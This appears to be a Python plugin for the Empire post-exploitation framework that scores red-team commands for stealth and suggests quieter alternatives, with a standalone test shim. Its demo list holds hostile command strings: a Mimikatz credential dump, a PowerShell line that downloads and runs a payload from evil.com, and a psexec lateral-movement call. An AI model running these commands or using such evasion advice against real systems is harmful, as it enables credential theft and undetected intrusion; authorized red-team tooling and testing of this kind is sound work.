#!/usr/bin/env python3
"""
Empire Plugin Integration for Empire Advisor

This module provides Empire plugin API compatibility for the advisor.
Can be used as a plugin in Empire 4.x+ or as a standalone shim for testing.

Authorized use only - see AUTHORIZED_USE.md
"""

from empire_advisor import EmpireAdvisor
import json

# Empire plugin metadata
INFO = {
    'Name': 'empire-advisor',
    'Authors': [
        {
            'Name': 'Research Team',
            'Handle': '@research',
            'Link': 'https://github.com/research/empire-advisor'
        }
    ],
    'Description': 'OPSEC advisor for Empire commands - scores tradecraft and suggests quieter alternatives',
    'Software': 'Empire 4.0+',
    'Techniques': ['T1059', 'T1055', 'T1003', 'T1047'],
    'Comments': [
        'Advisory only - never auto-executes alternatives',
        'Requires rules.yaml and knowledge_base.yaml in plugin directory',
        'See AUTHORIZED_USE.md for usage boundaries'
    ]
}


class Plugin:
    """Empire plugin class for advisor integration"""

    def __init__(self, main_menu):
        """
        Initialize plugin with Empire main menu

        Args:
            main_menu: Empire main menu object (None for standalone mode)
        """
        self.main_menu = main_menu
        self.advisor = None
        self.enabled = False

    def onLoad(self):
        """Called when plugin is loaded by Empire"""
        try:
            # Initialize advisor with rules from plugin directory
            self.advisor = EmpireAdvisor(
                rules_path='plugins/empire-advisor/rules.yaml',
                kb_path='plugins/empire-advisor/knowledge_base.yaml'
            )
            self.enabled = True
            return True
        except Exception as e:
            print(f"[!] Failed to load Empire Advisor: {e}")
            return False

    def execute(self, command):
        """
        Execute advisor on a command before Empire processes it

        This would be called as a pre-execution hook in Empire.
        Returns advisory result without executing the command.

        Args:
            command: Command string to evaluate

        Returns:
            dict: Advisory result
        """
        if not self.enabled or not self.advisor:
            return {'error': 'Advisor not initialized'}

        result = self.advisor.evaluate_command(command)

        # Display formatted advisory
        print(self.advisor.format_advisory(result))

        # Return structured result
        return result.to_dict()

    def register_hooks(self):
        """
        Register Empire command hooks (if Empire supports hooks)

        This is a placeholder for future Empire hook integration.
        Currently, operator must manually invoke advisor.
        """
        # Empire 4.x doesn't have pre-execution hooks by default
        # This would require Empire core modification or operator workflow integration
        pass

    def shutdown(self):
        """Called when plugin is unloaded"""
        self.enabled = False
        print("[*] Empire Advisor plugin unloaded")


# Standalone shim for testing without Empire
class StandaloneShim:
    """
    Shim for testing plugin without Empire installation

    Provides minimal Empire-like interface for acceptance testing.
    """

    def __init__(self):
        """Initialize shim"""
        self.plugin = Plugin(main_menu=None)
        self.plugin.advisor = EmpireAdvisor()
        self.plugin.enabled = True

    def execute_command(self, command: str) -> dict:
        """
        Execute command through advisor

        Args:
            command: Command to evaluate

        Returns:
            Advisory result as dict
        """
        return self.plugin.execute(command)

    def batch_evaluate(self, commands: list) -> list:
        """
        Evaluate multiple commands

        Args:
            commands: List of command strings

        Returns:
            List of advisory results
        """
        results = []
        for cmd in commands:
            result = self.execute_command(cmd)
            results.append(result)
        return results

    def save_results(self, results: list, output_path: str):
        """Save results to JSON file"""
        with open(output_path, 'w') as f:
            json.dump(results, f, indent=2)


def demo_standalone():
    """Demo function for standalone testing"""
    print("=" * 80)
    print("Empire Advisor - Standalone Shim Demo")
    print("=" * 80)

    shim = StandaloneShim()

    test_commands = [
        "Invoke-Mimikatz -DumpCreds",
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        "psexec \\\\target cmd.exe",
        "Get-Process"
    ]

    print("\nEvaluating test commands...\n")
    results = shim.batch_evaluate(test_commands)

    print("\n" + "=" * 80)
    print(f"Evaluated {len(results)} commands")
    print("=" * 80)

    return results


if __name__ == '__main__':
    demo_standalone()
